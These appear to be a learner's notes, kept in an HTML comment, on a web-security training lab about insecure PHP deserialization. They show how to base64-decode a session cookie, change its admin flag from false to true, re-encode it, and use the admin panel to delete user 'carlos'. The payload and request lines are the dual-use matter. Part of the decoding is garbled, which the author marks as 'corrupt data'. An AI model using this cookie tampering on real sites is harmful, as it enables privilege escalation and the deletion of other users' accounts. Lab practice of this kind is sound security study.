<!-- 
1) login as normal user to get the session cookie
2) Base64 Decode the cookie
    Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0O30%3d
                                                             |||||| this portion might not mean anything for it seems curropt data.   
3) Modify it to become admin and base64 encode it before supplying
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1O30%3d
    Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
    we can see the admin panel <a> now
4) Delete some other user 
    change endpoint from : GET /my-account?id=wiener
    change endpoint to : GET /admin 
    we can see the delete carlos user <a> now  
    change endpoint to : GET /admin/delete?username=carlos
    
!-->
